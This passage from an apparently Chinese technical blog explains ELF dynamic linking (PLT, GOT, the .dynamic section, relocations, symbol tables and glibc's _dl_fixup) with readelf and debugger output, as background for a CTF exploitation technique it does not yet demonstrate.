<figcaption aria-hidden="true">此后的调用</figcaption>
</figure>
<p>这里面提到了两个表，PLT表，GOT表</p>
<p>如果gdb加了pwndbg插件，可以使用plt和got命令观察两者</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; elfheader</span><br><span class="line">0x8048194 - 0x80481b4  .interp</span><br><span class="line">0x80481b4 - 0x80481d8  .note.gnu.build-id</span><br><span class="line">0x80481d8 - 0x80481f8  .note.ABI-tag</span><br><span class="line">0x80481f8 - 0x8048218  .gnu.hash</span><br><span class="line">0x8048218 - 0x8048268  .dynsym</span><br><span class="line">0x8048268 - 0x80482d1  .dynstr</span><br><span class="line">0x80482d2 - 0x80482dc  .gnu.version</span><br><span class="line">0x80482dc - 0x804830c  .gnu.version_r</span><br><span class="line">0x804830c - 0x8048314  .rel.dyn</span><br><span class="line">0x8048314 - 0x8048324  .rel.plt</span><br><span class="line">0x8049000 - 0x8049020  .init</span><br><span class="line">0x8049020 - 0x8049050  .plt</span><br><span class="line">0x8049050 - 0x80491a6  .text</span><br><span class="line">0x80491a8 - 0x80491bc  .fini</span><br><span class="line">0x804a000 - 0x804a013  .rodata</span><br><span class="line">0x804a014 - 0x804a048  .eh_frame_hdr</span><br><span class="line">0x804a048 - 0x804a110  .eh_frame</span><br><span class="line">0x804bef8 - 0x804befc  .init_array</span><br><span class="line">0x804befc - 0x804bf00  .fini_array</span><br><span class="line">0x804bf00 - 0x804bff0  .dynamic</span><br><span class="line">0x804bff0 - 0x804bff4  .got</span><br><span class="line">0x804bff4 - 0x804c008  .got.plt</span><br><span class="line">0x804c008 - 0x804c010  .data</span><br><span class="line">0x804c010 - 0x804c014  .bss</span><br><span class="line"></span><br><span class="line">pwndbg&gt; plt</span><br><span class="line">0x8049030: __libc_start_main@plt</span><br><span class="line">0x8049040: <span class="built_in">printf</span>@plt</span><br><span class="line">pwndbg&gt; got</span><br><span class="line"></span><br><span class="line">GOT protection: Partial RELRO | GOT <span class="built_in">functions</span>: 2</span><br><span class="line"></span><br><span class="line">[0x804c000] __libc_start_main@GLIBC_2.34 -&gt; 0xf7cf8cf0 (__libc_start_main_impl) ◂— push   ebp</span><br><span class="line">[0x804c004] <span class="built_in">printf</span>@GLIBC_2.0 -&gt; 0x8049046 (<span class="built_in">printf</span>@plt+6) ◂— push   8</span><br></pre></td></tr></table></figure>
<h3 id="plt的作用">PLT的作用</h3>
<p>对每一个glibc中的函数func,都会有一个plt表项</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jmp * func@got</span><br><span class="line">push index</span><br><span class="line">jmp * _dl_runtime_resolve@got</span><br></pre></td></tr></table></figure>
<p>如果got中填写了正确的函数地址,则会直接调用该函数</p>
<p>如果got中填写了push index的地址,则调用_dl_runtime_resolve解析符号</p>
<p>解析符号的依据就是这个index,导入函数下标</p>
<p>.plt(procedure Linkage Table，过程链接表)</p>
<p>.plt.got专门用于存放<code>__cxa_finalize</code>函数的plt条目</p>
<h3 id="got的作用">GOT的作用</h3>
<p>存放函数地址</p>
<p>如果尚未解析则存放对应函数plt中的下一条指令地址</p>
<p>GOT表分成两部分</p>
<p>.got和.got.plt</p>
<p>.got(Global Offset Table),全局变量地址表</p>
<p>.got.plt是全局函数地址表</p>
<p>前面我们所说的write@got实际上是write<span class="citation"
data-cites="got.plt">@got.plt</span></p>
<p>.got表纯纯存放全局变量地址,有一个算一个,没有特别之处</p>
<p>.got.plt的前三个表项存放了特殊地址,其后的表项就是全局函数地址了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:0804A000 14 9F 04 08                   _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC</span><br><span class="line">.got.plt:0804A000                                                                       ; DATA XREF: _init_proc+9↑o</span><br><span class="line">.got.plt:0804A000                                                                       ; _start+10↑o ...</span><br><span class="line">.got.plt:0804A004 00 00 00 00                   dword_804A004   dd 0                    ; DATA XREF: sub_80482D0↑r</span><br><span class="line">.got.plt:0804A008 00 00 00 00                   dword_804A008   dd 0                    ; DATA XREF: sub_80482D0+6↑r</span><br><span class="line">.got.plt:0804A00C 24 A0 04 08                   off_804A00C     dd offset __libc_start_main</span><br><span class="line">.got.plt:0804A00C                                                                       ; DATA XREF: ___libc_start_main↑r</span><br><span class="line">.got.plt:0804A010 28 A0 04 08                   off_804A010     dd offset write         ; DATA XREF: _write↑r</span><br><span class="line">.got.plt:0804A010                               _got_plt        ends</span><br></pre></td></tr></table></figure>
<h4 id="got.plt0.dynamic">.GOT.PLT[0]=.dynamic</h4>
<p>.GOT.PLT[0]存放.dynamic节的地址,在节头表中可以查看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/6.1.3_pwn_xdctf2015_pwn200# readelf -S test</span><br><span class="line">There are 35 section headers, starting at offset 0x1fbc:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">	...</span><br><span class="line">  [21] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">	...</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  p (processor specific)</span><br></pre></td></tr></table></figure>
<p>.dynamic节在0x08049f14,因此GOT[0]=0x08049f14</p>
<p>这个节的作用是什么呢?</p>
<p>可以用readelf -d查看节内容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/<span class="number">6.1</span><span class="number">.3</span>_pwn_xdctf2015_pwn200<span class="meta"># readelf -d test</span></span><br><span class="line"></span><br><span class="line">Dynamic section at offset <span class="number">0xf14</span> contains <span class="number">24</span> entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> <span class="number">0x00000001</span> (NEEDED)                     Shared library: [libc.so<span class="number">.6</span>]</span><br><span class="line"> <span class="number">0x0000000c</span> (INIT)                       <span class="number">0x80482ac</span></span><br><span class="line"> <span class="number">0x0000000d</span> (FINI)                       <span class="number">0x80484d4</span></span><br><span class="line"> <span class="number">0x00000019</span> (INIT_ARRAY)                 <span class="number">0x8049f0c</span></span><br><span class="line"> <span class="number">0x0000001b</span> (INIT_ARRAYSZ)               <span class="number">4</span> (bytes)</span><br><span class="line"> <span class="number">0x0000001a</span> (FINI_ARRAY)                 <span class="number">0x8049f10</span></span><br><span class="line"> <span class="number">0x0000001c</span> (FINI_ARRAYSZ)               <span class="number">4</span> (bytes)</span><br><span class="line"> <span class="number">0x6ffffef5</span> (GNU_HASH)                   <span class="number">0x80481ac</span></span><br><span class="line"> <span class="number">0x00000005</span> (STRTAB)                     <span class="number">0x804821c</span></span><br><span class="line"> <span class="number">0x00000006</span> (SYMTAB)                     <span class="number">0x80481cc</span></span><br><span class="line"> <span class="number">0x0000000a</span> (STRSZ)                      <span class="number">75</span> (bytes)</span><br><span class="line"> <span class="number">0x0000000b</span> (SYMENT)                     <span class="number">16</span> (bytes)</span><br><span class="line"> <span class="number">0x00000015</span> (DEBUG)                      <span class="number">0x0</span></span><br><span class="line"> <span class="number">0x00000003</span> (PLTGOT)                     <span class="number">0x804a000</span></span><br><span class="line"> <span class="number">0x00000002</span> (PLTRELSZ)                   <span class="number">16</span> (bytes)</span><br><span class="line"> <span class="number">0x00000014</span> (PLTREL)                     REL</span><br><span class="line"> <span class="number">0x00000017</span> (JMPREL)                     <span class="number">0x804829c</span></span><br><span class="line"> <span class="number">0x00000011</span> (REL)                        <span class="number">0x8048294</span></span><br><span class="line"> <span class="number">0x00000012</span> (RELSZ)                      <span class="number">8</span> (bytes)</span><br><span class="line"> <span class="number">0x00000013</span> (RELENT)                     <span class="number">8</span> (bytes)</span><br><span class="line"> <span class="number">0x6ffffffe</span> (VERNEED)                    <span class="number">0x8048274</span></span><br><span class="line"> <span class="number">0x6fffffff</span> (VERNEEDNUM)                 <span class="number">1</span></span><br><span class="line"> <span class="number">0x6ffffff0</span> (VERSYM)                     <span class="number">0x8048268</span></span><br><span class="line"> <span class="number">0x00000000</span> (<span class="literal">NULL</span>)                       <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>每一项都是一个<code>Elf32_Dyn</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure>
<p>这是一个键值对,键是d_tag,值要么是d_val要么是d_ptr</p>
<p>d_tag是一些枚举值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NULL    0   <span class="comment">/* Marks end of dynamic section */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NEEDED  1   <span class="comment">/* Name of needed library */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTRELSZ 2  <span class="comment">/* Size in bytes of PLT relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTGOT  3   <span class="comment">/* Processor defined value */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_HASH    4   <span class="comment">/* Address of symbol hash table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRTAB  5   <span class="comment">/* Address of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMTAB  6   <span class="comment">/* Address of symbol table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELA    7   <span class="comment">/* Address of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELASZ  8   <span class="comment">/* Total size of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRSZ   10  <span class="comment">/* Size in bytes of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMENT  11  <span class="comment">/* Size of one symbol table entry */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_INIT    12  <span class="comment">/* Address of init function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_FINI    13  <span class="comment">/* Address of termination function */</span></span></span><br></pre></td></tr></table></figure>
<p>这个节指示了很多信息,比如init函数和init_array的地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000000c</span> (INIT)                       <span class="number">0x80482ac</span></span><br><span class="line"><span class="number">0x00000019</span> (INIT_ARRAY)                 <span class="number">0x8049f0c</span></span><br></pre></td></tr></table></figure>
<p>比如符号表和字符串表地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00000005 (STRTAB)                     0x804821c</span><br><span class="line">0x00000006 (SYMTAB)                     0x80481cc</span><br></pre></td></tr></table></figure>
<p>比如重定位信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00000011</span> (REL)                        <span class="number">0x8048294</span></span><br></pre></td></tr></table></figure>
<p>这个表有何作用呢?</p>
<p>一是指导动态链接器进行</p>
<p>​ 加载so</p>
<p>​ 解析符号</p>
<p>​ 重定位</p>
<p>​ 调用初始化函数</p>
<p>二是运行时</p>
<p>​ 延迟绑定</p>
<p>​ 处理dlopen显示加载的函数</p>
<blockquote>
<p>关于重定位</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/6.1.3_pwn_xdctf2015_pwn200# readelf -r <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.dyn&#x27;</span> at offset 0x294 contains 1 entry:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">08049ffc  00000106 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.plt&#x27;</span> at offset 0x29c contains 2 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">0804a00c  00000207 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a010  00000307 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0</span><br></pre></td></tr></table></figure>
<p>每一个重定位表项都对应一个<code>Elf32_Rel</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset;       <span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word    r_info;         <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>
<p>r_offset是符号got表项的虚拟地址</p>
<p>r_info是符号的重定位类型和符号下标</p>
<p>​
重定位类型最常见全局变量的R_386_GLOB_DAT和全局函数的R_386_JUMP_SLOT</p>
<p>​ 符号下标索引.dynsym节</p>
<p>比如<code>write</code>的索引是3,</p>
<p><code>libc_start_main</code>的索引是2</p>
<p><code>__gmon_start__</code>的索引是1</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/<span class="number">6.1</span><span class="number">.3</span>_pwn_xdctf2015_pwn200<span class="meta"># readelf -s test</span></span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.dynsym&#x27;</span> contains <span class="number">5</span> entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     <span class="number">1</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     <span class="number">2</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2<span class="number">.0</span> (<span class="number">2</span>)</span><br><span class="line">     <span class="number">3</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND write@GLIBC_2<span class="number">.0</span> (<span class="number">2</span>)</span><br><span class="line">     <span class="number">4</span>: <span class="number">080484</span>ec     <span class="number">4</span> OBJECT  GLOBAL DEFAULT   <span class="number">16</span> _IO_stdin_used</span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">70</span> entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">		...</span><br><span class="line">    <span class="number">32</span>: <span class="number">00000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS crtstuff.c</span><br><span class="line">    <span class="number">33</span>: <span class="number">08048370</span>     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">14</span> deregister_tm_clones</span><br><span class="line">    <span class="number">34</span>: <span class="number">080483b</span>0     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">14</span> register_tm_clones</span><br><span class="line">    <span class="number">35</span>: <span class="number">080483f</span>0     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">14</span> __do_global_dtors_aux</span><br><span class="line">    <span class="number">36</span>: <span class="number">0804</span>a01c     <span class="number">1</span> OBJECT  LOCAL  DEFAULT   <span class="number">25</span> completed<span class="number">.7283</span></span><br><span class="line">    <span class="number">37</span>: <span class="number">08049f</span>10     <span class="number">0</span> OBJECT  LOCAL  DEFAULT   <span class="number">20</span> __do_global_dtors_aux_fin</span><br><span class="line">    <span class="number">38</span>: <span class="number">08048420</span>     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">14</span> frame_dummy</span><br><span class="line">    <span class="number">39</span>: <span class="number">08049f</span>0c     <span class="number">0</span> OBJECT  LOCAL  DEFAULT   <span class="number">19</span> __frame_dummy_init_array_</span><br><span class="line">    <span class="number">40</span>: <span class="number">00000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS test.c</span><br><span class="line">	...</span><br><span class="line">    <span class="number">66</span>: <span class="number">08048426</span>    <span class="number">64</span> FUNC    GLOBAL DEFAULT   <span class="number">14</span> main</span><br><span class="line">    <span class="number">67</span>: <span class="number">08048466</span>     <span class="number">0</span> FUNC    GLOBAL HIDDEN    <span class="number">14</span> __x86.get_pc_thunk.ax</span><br><span class="line">    <span class="number">68</span>: <span class="number">0804</span>a01c     <span class="number">0</span> OBJECT  GLOBAL HIDDEN    <span class="number">24</span> __TMC_END__</span><br><span class="line">    <span class="number">69</span>: <span class="number">080482</span>ac     <span class="number">0</span> FUNC    GLOBAL DEFAULT   <span class="number">11</span> _init</span><br></pre></td></tr></table></figure>
<p>readelf
-s会读取两个表,一个是本地符号表symtab,一个是链接符号表.dynsym</p>
<p>这个symtab可以strip掉,不影响程序执行</p>
<p>而实际上这两个符号表的表项中并没有Name数组,st_name是一个索引,索引字符串表.strtab</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name;        /* Symbol name (string tbl index) */</span><br><span class="line">  Elf32_Addr    st_value;       /* Symbol value */</span><br><span class="line">  Elf32_Word    st_size;        /* Symbol size */</span><br><span class="line">  unsigned char st_info;        /* Symbol type and binding */</span><br><span class="line">  unsigned char st_other;       /* Symbol visibility */</span><br><span class="line">  Elf32_Section st_shndx;       /* Section index */</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1C7Ch: 00 63 72 74 73 74 75 66 66 2E 63 00 64 65 72 65  .crtstuff.c.dere </span><br><span class="line">1C8Ch: 67 69 73 74 65 72 5F 74 6D 5F 63 6C 6F 6E 65 73  gister_tm_clones </span><br><span class="line">1C9Ch: 00 5F 5F 64 6F 5F 67 6C 6F 62 61 6C 5F 64 74 6F  .__do_global_dto </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>比如crtstuff.c的符号表项Elf32_Sym中,st_name=1,对应0x1c7c+1</p>
<p>比如deregister_tm_clones的符号表项Elf32_Sym中,st_name=c,对应0x1c7c+c</p>
<p>这里0x1c7c是.strtab节在文件中的偏移量,可以使用readelf
-S查看对应节区</p>
</blockquote>
<h4 id="got.plt1link_map-ld">.GOT.PLT[1]=link_map @ ld</h4>
<p>.GOT.PLT[1]和.GOT.PLT[2]在编译链接时无法决定是啥，只有在运行时才会知道是什么</p>
<p>.GOT.PLT[1]用于存放<strong>主模块的</strong>link_map数据结构的地址</p>
<p>每个模块(主模块以及所有加载的动态库)都各自有一个link_map</p>
<p>这个link_map保存了对应模块的诸多信息,比如各个节区的地址,elf头的地址,模块名等</p>
<h4 id="got.plt2dl_runtime_resolve-ld">.GOT.PLT[2]=dl_runtime_resolve @
ld</h4>
<p>存放dl_runtime_resolve的地址</p>
<h4 id="got.plt3">.GOT.PLT[3+]</h4>
<p>第四项及之后,该表用于保存函数的虚拟地址</p>
<h3 id="疑问">疑问</h3>
<p>每个函数的plt表都有三项</p>
<p>jmp</p>
<p>push</p>
<p>jmp</p>
<p>这里第一个jmp调试观察是到push这行</p>
<p>第二个jmp是到dl_runtime_resolve函数中</p>
<p>那么中间push了什么呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//____libc_start_main</span><br><span class="line">.plt:080482E0 FF 25 0C A0 04 08                             jmp     ds:off_804A00C</span><br><span class="line">.plt:080482E6 68 00 00 00 00                                push    0</span><br><span class="line">.plt:080482EB E9 E0 FF FF FF                                jmp     sub_80482D0</span><br><span class="line"></span><br><span class="line">//write</span><br><span class="line">.plt:080482F0 FF 25 10 A0 04 08                             jmp     ds:off_804A010</span><br><span class="line">.plt:080482F6 68 08 00 00 00                                push    8</span><br><span class="line">.plt:080482FB E9 D0 FF FF FF                                jmp     sub_80482D0</span><br></pre></td></tr></table></figure>
<p>符号又到底是如何解析并且回填到GOT表的呢?</p>
<p>为了解决这些问题,以及学习ret2dlresolve的原理,</p>
<p>下面我们阅读<code>_dl_fixup</code>的源码寻找答案</p>
<h2 id="dl_fixup">_dl_fixup</h2>
<p>以write为例，观察该符号是如何解析的</p>
<p>解析符号发生在<code>_dl_fixup</code>函数中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (<span class="keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)</span><br></pre></td></tr></table></figure>
<p>该函数有两个参数，其中<code>link_map *l</code>参数就是<code>.got.plt[1]</code>,</p>
<p>参数reloc_arg是目标函数在.rel.plt中的偏移量</p>
<p>reloc_arg在write@plt中被压入栈中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x80483a0</span> &lt;write@plt&gt;:       jmp    DWORD PTR ds:<span class="number">0x80498d4</span></span><br><span class="line"><span class="number">0x80483a6</span> &lt;write@plt+<span class="number">6</span>&gt;:     push   <span class="number">0x20</span></span><br><span class="line"><span class="number">0x80483ab</span> &lt;write@plt+<span class="number">11</span>&gt;:    jmp    <span class="number">0x8048350</span></span><br></pre></td></tr></table></figure>
<p>然后跳转到<code>plt[0]=0x8048350</code>，这是<code>_dl_runtime_resolve</code>的导火索，在这里首先将<code>link_map *l</code>压入栈中,然后跳转_<code>dl_runtime_resolve</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x8048350</span>                              push   dword ptr [<span class="number">0x80498bc</span>]</span><br><span class="line">  <span class="number">0x8048356</span>                              jmp    dword ptr [<span class="number">0x80498c0</span>]       &lt;_dl_runtime_resolve&gt;</span><br></pre></td></tr></table></figure>
<p>在<code>_dl_runtime_resolve</code>中,这两个参数又改用<code>eax(link_map *l)</code>和<code>edx(reloc_arg)</code>传递,稍微违背了x86调用约定,但是问题不大</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_dl_runtime_resolve:</span><br><span class="line">	cfi_adjust_cfa_offset (<span class="number">8</span>)</span><br><span class="line">	_CET_ENDBR</span><br><span class="line">	pushl %eax		# Preserve registers otherwise clobbered.</span><br><span class="line">	cfi_adjust_cfa_offset (<span class="number">4</span>)</span><br><span class="line">	pushl %ecx</span><br><span class="line">	<span class="title function_">cfi_adjust_cfa_offset</span> <span class="params">(<span class="number">4</span>)</span></span><br><span class="line">	pushl %edx</span><br><span class="line">	<span class="title function_">cfi_adjust_cfa_offset</span> <span class="params">(<span class="number">4</span>)</span></span><br><span class="line">	movl 16<span class="params">(%esp)</span>, %edx	# Copy args pushed by PLT in <span class="keyword">register</span>.  Note</span><br><span class="line">	movl 12<span class="params">(%esp)</span>, %eax	<span class="meta"># that `fixup<span class="string">&#x27; takes its parameters in regs.</span></span></span><br><span class="line"><span class="string"><span class="meta">	call _dl_fixup		# Call resolver.</span></span></span><br></pre></td></tr></table></figure>
<p><code>_dl_runtime_resolve</code>实际上只是一个包装函数,实际工作是<code>_dl_fixup</code>完成的</p>
<p><code>_dl_fixup</code>干了啥呢?</p>
<p><code>_dl_fixup</code>知道两件事,</p>
<p>一个是主程序模块的<code>link_map</code>,这玩意儿保存了很多信息,包括它属于哪个模块,该模块的elf信息等等</p>
<p>一个进程所有模块的<code>link_map</code>以双向链表连接</p>
<blockquote>
<p>每个模块(主程序和每个so库)各自有一个link_map</p>
